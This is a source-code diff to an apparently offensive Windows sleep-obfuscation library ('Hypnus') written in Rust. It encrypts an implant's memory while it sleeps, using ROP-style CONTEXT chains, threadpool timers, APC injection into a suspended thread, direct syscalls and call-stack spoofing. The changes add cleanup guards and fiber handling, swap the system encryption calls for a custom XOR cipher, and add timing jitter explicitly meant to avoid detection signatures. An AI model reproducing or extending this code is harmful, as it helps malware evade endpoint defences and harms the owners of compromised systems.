@@ -423,24 +423,40 @@ pub enum WakeReason {
 impl WakeReason {
     /// Create from WaitForMultipleObjects return value
     pub fn from_wfmo_result(result: u32, handle_count: usize) -> Self {
+        const WAIT_ABANDONED_0: u32 = 0x00000080;
+        
         if result == WAIT_TIMEOUT {
             return Self::Timeout;
         }
         if result == WAIT_FAILED {
             return Self::Error;
         }
+        
+        // Check for normal signaled state
         let index = result.wrapping_sub(WAIT_OBJECT_0) as usize;
         if index < handle_count {
-            match index {
+            return match index {
                 0 => Self::Handle0,
                 1 => Self::Handle1,
                 2 => Self::Handle2,
                 3 => Self::Handle3,
                 _ => Self::Error,
-            }
-        } else {
-            Self::Error
+            };
         }
+        
+        // Check for abandoned state (treat same as signaled)
+        let abandoned_index = result.wrapping_sub(WAIT_ABANDONED_0) as usize;
+        if abandoned_index < handle_count {
+            return match abandoned_index {
+                0 => Self::Handle0,
+                1 => Self::Handle1,
+                2 => Self::Handle2,
+                3 => Self::Handle3,
+                _ => Self::Error,
+            };
+        }
+        
+        Self::Error
     }
     
     /// Check if a specific handle was signaled
@@ -472,6 +488,56 @@ struct Hypnus {
 
     /// Obfuscation modes.
     mode: ObfMode,
+}
+
+/// RAII guard for thread pool resources (events, pool, thread handle).
+/// Ensures cleanup on early return from bail!() in timer/wait methods.
+struct PoolCleanupGuard {
+    events: [*mut c_void; 4],
+    event_count: usize,
+    pool: *mut c_void,
+    h_thread: *mut c_void,
+}
+
+impl Drop for PoolCleanupGuard {
+    fn drop(&mut self) {
+        unsafe {
+            if !self.h_thread.is_null() {
+                NtClose(self.h_thread);
+            }
+            if !self.pool.is_null() {
+                CloseThreadpool(self.pool);
+            }
+            for i in 0..self.event_count {
+                if !self.events[i].is_null() {
+                    NtClose(self.events[i]);
+                }
+            }
+        }
+    }
+}
+
+/// RAII guard for foliage resources (event, helper thread, duplicated thread).
+struct FoliageCleanupGuard {
+    event: *mut c_void,
+    h_thread: *mut c_void,
+    thread: *mut c_void,
+}
+
+impl Drop for FoliageCleanupGuard {
+    fn drop(&mut self) {
+        unsafe {
+            if !self.event.is_null() {
+                NtClose(self.event);
+            }
+            if !self.h_thread.is_null() {
+                NtClose(self.h_thread);
+            }
+            if !self.thread.is_null() {
+                NtClose(self.thread);
+            }
+        }
+    }
 }
 
 impl Hypnus {
@@ -514,6 +580,9 @@ impl Hypnus {
     ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
     ///   via a trampoline during ROP chain execution.
     fn timer(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
+        let uses_handles = matches!(self.wait, WaitPrimitive::Handles { .. });
+        self.cfg.validate_timer_wait_apis(uses_handles)?;
+
         unsafe {
             // Determine if heap obfuscation and RWX memory should be use
             let heap = self.mode.contains(ObfMode::Heap);
@@ -539,12 +608,21 @@ impl Hypnus {
                 }
             }
 
+            // RAII guard ensures cleanup on bail!() early return
+            let mut guard = PoolCleanupGuard {
+                events: [events[0], events[1], events[2], null_mut()],
+                event_count: 3,
+                pool: null_mut(),
+                h_thread: null_mut(),
+            };
+
             // Allocate dedicated threadpool with one worker
             let mut pool = null_mut();
             let mut status = TpAllocPool(&mut pool, null_mut());
             if !NT_SUCCESS(status) {
                 bail!(s!("TpAllocPool Failed"));
             }
+            guard.pool = pool;
 
             // Configure threadpool stack sizes
             let mut stack = TP_POOL_STACK_INFORMATION { StackCommit: 0x80000, StackReserve: 0x80000 };
@@ -629,6 +707,7 @@ impl Hypnus {
             if !NT_SUCCESS(status) {
                 bail!(s!("NtDuplicateObject Failed"));
             }
+            guard.h_thread = h_thread;
 
             // Base CONTEXT for spoofing
             ctx_init.Rsp = current_rsp();
@@ -649,8 +728,8 @@ impl Hypnus {
             ctxs[1].R8  = size.as_u64();
             ctxs[1].R9  = PAGE_READWRITE as u64;
 
-            // Encrypt region
-            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
+            // Encrypt region (custom SIMD XOR cipher)
+            ctxs[2].jmp(self.cfg, self.cfg.custom_encrypt);
             ctxs[2].Rcx = base;
             ctxs[2].Rdx = size;
             ctxs[2].R8  = 0;
@@ -700,8 +779,8 @@ impl Hypnus {
                 }
             }
 
-            // Decrypt region
-            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
+            // Decrypt region (custom SIMD XOR cipher - self-inverse)
+            ctxs[6].jmp(self.cfg, self.cfg.custom_decrypt);
             ctxs[6].Rcx = base;
             ctxs[6].Rdx = size;
             ctxs[6].R8  = 0;
@@ -754,8 +833,9 @@ impl Hypnus {
                     bail!(s!("TpAllocTimer Failed"));
                 }
 
-                // Add 100ms per step
-                delay.QuadPart += -(100_i64 * 10_000);
+                // Add ~100ms per step with +/- 20ms jitter to avoid uniform timing signatures
+                let jitter = (core::arch::x86_64::_rdtsc() % 41) as i64 - 20; // -20 to +20ms
+                delay.QuadPart += -((100 + jitter) * 10_000);
                 TpSetTimer(timer, &mut delay, 0, 0);
             }
 
@@ -779,13 +859,6 @@ impl Hypnus {
                 obfuscate_heap(&key);
             }
 
-            // Cleanup
-            NtClose(h_thread);
-            CloseThreadpool(pool);
-            events.iter().for_each(|h| {
-                NtClose(*h);
-            });
-
             Ok(())
         }
     }
@@ -800,6 +873,9 @@ impl Hypnus {
     ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
     ///   via a trampoline during ROP chain execution.
     fn wait(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
+        let uses_handles = matches!(self.wait, WaitPrimitive::Handles { .. });
+        self.cfg.validate_timer_wait_apis(uses_handles)?;
+
         unsafe {
             // Determine if heap obfuscation and RWX memory should be use
             let heap = self.mode.contains(ObfMode::Heap);
@@ -825,12 +901,21 @@ impl Hypnus {
                 }
             }
 
+            // RAII guard ensures cleanup on bail!() early return
+            let mut guard = PoolCleanupGuard {
+                events,
+                event_count: 4,
+                pool: null_mut(),
+                h_thread: null_mut(),
+            };
+
             // Allocate dedicated threadpool with one worker
             let mut pool = null_mut();
             let mut status = TpAllocPool(&mut pool, null_mut());
             if !NT_SUCCESS(status) {
                 bail!(s!("TpAllocPool Failed"));
             }
+            guard.pool = pool;
 
             // Configure threadpool stack sizes
             let mut stack = TP_POOL_STACK_INFORMATION { StackCommit: 0x80000, StackReserve: 0x80000 };
@@ -915,6 +1000,7 @@ impl Hypnus {
             if !NT_SUCCESS(status) {
                 bail!(s!("NtDuplicateObject Failed"));
             }
+            guard.h_thread = h_thread;
 
             // Base CONTEXT for spoofing
             ctx_init.Rsp = current_rsp();
@@ -935,8 +1021,8 @@ impl Hypnus {
             ctxs[1].R8  = size.as_u64();
             ctxs[1].R9  = PAGE_READWRITE as u64;
 
-            // Encrypt region
-            ctxs[2].jmp(self.cfg, self.cfg.system_function040.into());
+            // Encrypt region (custom SIMD XOR cipher)
+            ctxs[2].jmp(self.cfg, self.cfg.custom_encrypt);
             ctxs[2].Rcx = base;
             ctxs[2].Rdx = size;
             ctxs[2].R8  = 0;
@@ -986,8 +1072,8 @@ impl Hypnus {
                 }
             }
 
-            // Decrypt region
-            ctxs[6].jmp(self.cfg, self.cfg.system_function041.into());
+            // Decrypt region (custom SIMD XOR cipher - self-inverse)
+            ctxs[6].jmp(self.cfg, self.cfg.custom_decrypt);
             ctxs[6].Rcx = base;
             ctxs[6].Rdx = size;
             ctxs[6].R8  = 0;
@@ -1040,8 +1126,9 @@ impl Hypnus {
                     bail!(s!("TpAllocWait Failed"));
                 }
 
-                // Add 100ms per step
-                delay.QuadPart += -(100_i64 * 10_000);
+                // Add ~100ms per step with +/- 20ms jitter to avoid uniform timing signatures
+                let jitter = (core::arch::x86_64::_rdtsc() % 41) as i64 - 20; // -20 to +20ms
+                delay.QuadPart += -((100 + jitter) * 10_000);
                 TpSetWait(wait, events[0], &mut delay);
             }
 
@@ -1065,13 +1152,6 @@ impl Hypnus {
                 obfuscate_heap(&key);
             }
 
-            // Cleanup
-            NtClose(h_thread);
-            CloseThreadpool(pool);
-            events.iter().for_each(|h| {
-                NtClose(*h);
-            });
-
             Ok(())
         }
     }
@@ -1083,6 +1163,9 @@ impl Hypnus {
     ///   When non-null and using `WaitPrimitive::Handles`, the WFMO result is captured
     ///   via a trampoline during ROP chain execution.
     fn foliage(&mut self, wfmo_result_ptr: *mut u64) -> Result<()> {
+        let uses_handles = matches!(self.wait, WaitPrimitive::Handles { .. });
+        self.cfg.validate_foliage_apis(uses_handles)?;
+
         unsafe {
             // Determine if heap obfuscation and RWX memory should be use
             let heap = self.mode.contains(ObfMode::Heap);
@@ -1106,6 +1189,13 @@ impl Hypnus {
                 bail!(s!("NtCreateEvent Failed"));
             }
 
+            // RAII guard ensures cleanup on bail!() early return
+            let mut guard = FoliageCleanupGuard {
+                event,
+                h_thread: null_mut(),
+                thread: null_mut(),
+            };
+
             // Create a new thread in suspended state for APC injection
             let mut h_thread = null_mut::<c_void>();
             status = uwd::syscall!(
@@ -1126,6 +1216,7 @@ impl Hypnus {
             if !NT_SUCCESS(status) {
                 bail!(s!("NtCreateThreadEx Failed"));
             }
+            guard.h_thread = h_thread;
 
             // Get the initial context of the suspended thread
             let mut ctx_init = CONTEXT { ContextFlags: CONTEXT_FULL, ..Default::default() };
@@ -1152,6 +1243,7 @@ impl Hypnus {
             if !NT_SUCCESS(status) {
                 bail!(s!("NtDuplicateObject Failed"));
             }
+            guard.thread = thread;
 
             // Preparing for call stack spoofing
             ctx_init.Rsp = current_rsp();
@@ -1172,8 +1264,8 @@ impl Hypnus {
             ctxs[1].R8  = size.as_u64();
             ctxs[1].R9  = PAGE_READWRITE as u64;
 
-            // Encrypts or masks the specified memory region
-            ctxs[2].Rip = self.cfg.system_function040.into();
+            // Encrypts the specified memory region (custom SIMD XOR cipher)
+            ctxs[2].Rip = self.cfg.custom_encrypt;
             ctxs[2].Rcx = base;
             ctxs[2].Rdx = size;
             ctxs[2].R8  = 0;
@@ -1223,8 +1315,8 @@ impl Hypnus {
                 }
             }
 
-            // Decrypts (unmasks) the memory after waking up
-            ctxs[6].Rip = self.cfg.system_function041.into();
+            // Decrypts the memory after waking up (custom SIMD XOR cipher - self-inverse)
+            ctxs[6].Rip = self.cfg.custom_decrypt;
             ctxs[6].Rcx = base;
             ctxs[6].Rdx = size;
             ctxs[6].R8  = 0;
@@ -1243,7 +1335,7 @@ impl Hypnus {
 
             // Gracefully terminates the helper thread after all steps are complete.
             ctxs[9].Rip = self.cfg.rtl_exit_user_thread.into();
-            ctxs[9].Rcx = h_thread as u64;
+            ctxs[9].Rcx = 0; // STATUS_SUCCESS
             ctxs[9].Rdx = 0;
 
             // Layout the entire spoofed CONTEXT chain on the stack
@@ -1304,10 +1396,6 @@ impl Hypnus {
                 obfuscate_heap(&key);
             }
 
-            // Clean up all handles
-            NtClose(event);
-            NtClose(h_thread);
-            NtClose(thread);
         }
 
         Ok(())
@@ -1319,12 +1407,41 @@ pub mod __private {
     use alloc::boxed::Box;
     use super::*;
 
+    /// Reads the current fiber pointer from the TEB (Thread Environment Block).
+    /// On x86_64 Windows, the fiber pointer is stored at gs:[0x20].
+    #[inline]
+    unsafe fn get_current_fiber() -> *mut c_void {
+        let fiber: *mut c_void;
+        core::arch::asm!("mov {}, gs:[0x20]", out(reg) fiber);
+        fiber
+    }
+
+    /// Converts the current thread to a fiber, handling the case where the
+    /// thread is already a fiber (e.g., from the loader or a prior call).
+    /// Returns `(master_fiber, did_convert)` where `did_convert` indicates
+    /// whether we need to call `ConvertFiberToThread` on cleanup.
+    fn acquire_fiber() -> Option<(*mut c_void, bool)> {
+        let master = ConvertThreadToFiber(null_mut());
+        if !master.is_null() {
+            return Some((master, true));
+        }
+
+        // ConvertThreadToFiber failed -- thread may already be a fiber.
+        // Read the current fiber pointer directly from the TEB.
+        let fiber = unsafe { get_current_fiber() };
+        if !fiber.is_null() {
+            Some((fiber, false))
+        } else {
+            None
+        }
+    }
+
     /// Execution sequence using the specified obfuscation strategy (backwards compatible).
     pub fn hypnus_entry(base: *mut c_void, size: u64, time: u64, obf: Obfuscation, mode: ObfMode) {
-        let master = ConvertThreadToFiber(null_mut());
-        if master.is_null() {
-            return;
-        }
+        let (master, did_convert) = match acquire_fiber() {
+            Some(pair) => pair,
+            None => return,
+        };
 
         match Hypnus::new(base as u64, size, time, mode) {
             Ok(hypnus) => {
@@ -1349,7 +1466,9 @@ pub mod __private {
 
                 SwitchToFiber(fiber);
                 DeleteFiber(fiber);
-                ConvertFiberToThread();
+                if did_convert {
+                    ConvertFiberToThread();
+                }
             }
             Err(_error) => {
                 #[cfg(debug_assertions)]
@@ -1372,10 +1491,10 @@ pub mod __private {
         obf: Obfuscation, 
         mode: ObfMode
     ) -> WakeReason {
-        let master = ConvertThreadToFiber(null_mut());
-        if master.is_null() {
-            return WakeReason::Error;
-        }
+        let (master, did_convert) = match acquire_fiber() {
+            Some(pair) => pair,
+            None => return WakeReason::Error,
+        };
 
         match Hypnus::new_with_wait(base as u64, size, wait, mode) {
             Ok(hypnus) => {
@@ -1417,7 +1536,9 @@ pub mod __private {
 
                 SwitchToFiber(fiber);
                 DeleteFiber(fiber);
-                ConvertFiberToThread();
+                if did_convert {
+                    ConvertFiberToThread();
+                }
                 
                 // For timeout-based waits, always return Timeout
                 if handle_count == 0 {
